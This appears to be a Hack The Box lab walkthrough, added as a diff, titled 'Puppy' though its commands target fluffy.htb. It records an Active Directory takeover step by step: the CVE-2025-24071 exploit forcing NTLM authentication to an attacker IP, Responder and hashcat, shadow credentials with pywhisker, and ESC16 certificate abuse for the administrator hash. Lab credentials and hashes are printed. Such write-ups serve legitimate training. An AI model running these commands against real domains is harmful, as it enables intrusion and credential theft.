@@ -1,1 +1,158 @@
+HTB Puppy
+---------------------------------------
+Credential Given:
+username: j.fleischman
+password: J0elTHEM4n1990!
+---------------------------------------
 
+1. Scanning & Enumeration
+nmap -sCV -T4 10.10.11.69 -v -oN nmap.txt
+
+Interesting Port:
+- 445 SMB
+- 5985 WinRM
+
+SMB Enum
+- smbclient -L //10.10.11.69/
+- nxc smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! --shares
+
+Interesting Share:
+- IT (READ, WRITE)
+
+Found:
+- Everything-1.4.1.1026.x64
+- KeePass-2.58
+- Upgrade_Notice.pdf (Interesting File)
+
+Download file
+- get Upgrade_Notice.pdf
+
+Useful Info from the pdf
+- CVE-2025-24996
+- CVE-2025-24071 (Public Exploit Found: https://github.com/ThemeHackers/CVE-2025-24071)
+- CVE-2025-46785
+- CVE-2025-29968
+- CVE-2025-21193
+- CVE-2025-3445
+
+Exploiting CVE-2025-24071
+- python3 exploit.py -i 10.10.16.23 -f upgrade.zip (arg: attacker IP, output filename)
+- upgrade.zip (containing the malicious library file: upgrade.zip.library-ms)
+
+Upload malicious library file to target machine via smbclient
+- put upgrade.zip.library-ms
+
+Open the file to trigger NTLM authentication
+- open upgrade.zip.library-ms
+
+Capture NTLMv2 hash with Responder
+- sudo responder -I tun0
+
+Crack the hash with Hashcat
+- hashcat -m 5600 hash.txt rockyou.txt (p.agila:prometheusx-303)
+
+---------------------------------------
+Bloodhound Enumeration
+---------------------------------------
+- bloodhound-python -u j.fleischman -p J0elTHEM4n1990! -d fluffy.htb -ns 10.10.11.69 -c All
+
+1) p.agila
+p.agila Group Membership
+- SERVICE ACCOUNTS MANAGERS (Interseting Group)
+- DOMAIN USERS
+
+p.agila Outbound object control
+- has GenericAll over SERVICE ACCOUNTS Group (we can add member to the group)
+
+2) SERVICE ACCOUNTS Group
+SERVICE ACCOUNTS Group members
+- winrm_svc
+- ldap_svc
+- ca_svc
+
+SERVICE ACCOUNTS Outbound object control
+- has GenericWrite over the 3 service accounts (we can perform shadow credentials attack)
+
+3) winrm_svc 
+winrm_svc Group Membership
+- SERVICE ACCOUNTS (has GenericWrite over the group)
+- REMOTE MANAGEMENT USERS (we can evil-winrm to the target machine)
+- DOMAIN USERS
+
+4) ca_svc
+ca_svc Group Membership
+- SERVICE ACCOUNTS (has GenericWrite over the group)
+- CERT PUBLISHERS (Interesting Group)
+- DOMAIN USERS
+
+---------------------------------------
+Shadow Credentials Attack
+---------------------------------------
+- https://www.hackingarticles.in/shadow-credentials-attack/ (article)
+- https://github.com/ShutdownRepo/pywhisker.git (tool)
+
+What is Shadow Credentials Attack
+- This attack leverages the mismanagement or exploitation of Active Directory Certificate Services (AD CS) to inject custom certificates into a user account, granting attackers persistent access
+- As a result of modifying the msDS-KeyCredentialLink attribute, adversaries can effectively create “shadow credentials” that allow them to authenticate as the target user without needing their password or NTLM hash
+
+1. List the current KeyCredential IDs
+- python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ldap_svc" --action "list"
+
+2. Generate public-private key pair and adds a new key credential to the target object
+- python3 pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ldap_svc" --action "add"
+
+Important Output:
+- pfx file: V1ULKT9T.pfx
+- file password: EYfvXmsjbyNzRlQQVFyq
+
+3. Obtaining the Kerberos TGT for the ldap_svc account with Certipy-ad
+- certipy-ad auth -pfx "V1ULKT9T.pfx" -password EYfvXmsjbyNzRlQQVFyq -dc-ip 10.10.11.69 -username ldap_svc -domain fluffy.htb
+
+Output:
+- TGT cache file: ldap_svc.ccache
+- NTLM hash for 'ldap_svc': aad3b435b51404eeaad3b435b51404ee:22151d74ba3de931a352cba1f9393a37 
+
+If encounting error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+- sudo ntpdate 10.10.11.69 (run this command and rerun the certipy)
+
+--> Alternative tool: https://github.com/dirkjanm/PKINITtools
+
+Repeat the attack with other service accounts (winrm_svc, ca_svc)
+
+Obtain user flag from: winrm_svc with remote management access
+
+---------------------------------------
+Privilege Escalation with CA Publishers
+---------------------------------------
+
+ADCS Enumeration with certipy-ad
+- certipy-ad find -u 'ca_svc@fluffy.htb' -hashes "aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8" -dc-ip 10.10.11.69 -text -enabled -hide-admins
+
+Output:
+[!] Vulnerabilities
+      ESC16 : Security Extension is disabled.
+[*] Remarks
+      ESC16 : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+
+Exploitation Guide:
+- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
+
+1. Read initial UPN of the controlled account
+- certipy-ad account -u ca_svc@fluffy.htb -hashes "aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8" -dc-ip 10.10.11.69 -user 'ca_svc' read 
+(userPrincipalName: ca_svc@fluffy.htb)
+
+2. Update the victim account's UPN to the target administrator's sAMAccountName
+- certipy-ad account -u ca_svc@fluffy.htb -hashes "aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8" -dc-ip 10.10.11.69 -upn 'administrator@fluffy.htb' -user 'ca_svc' update
+(read again and make sure the upn becomes -> userPrincipalName: administrator)
+
+3. Request a certificate as the "ca_svc" user with the elevated upn (administrator)
+- certipy-ad req -dc-ip 10.10.11.69 -u 'ca_svc' -hashes "aad3b435b51404eeaad3b435b51404ee:ca0f4f9e9eb8a092addf53bb03fc98c8"  -target 'fluffy.htb' -ca 'fluffy-DC01-CA'
+
+Output: administrator.pfx
+
+4. Authenticate as the target administrator
+- certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.69 -username 'administrator' -domain fluffy.htb
+
+Output: administrator NTLM hash (aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e)
+
+Obtain root flag!
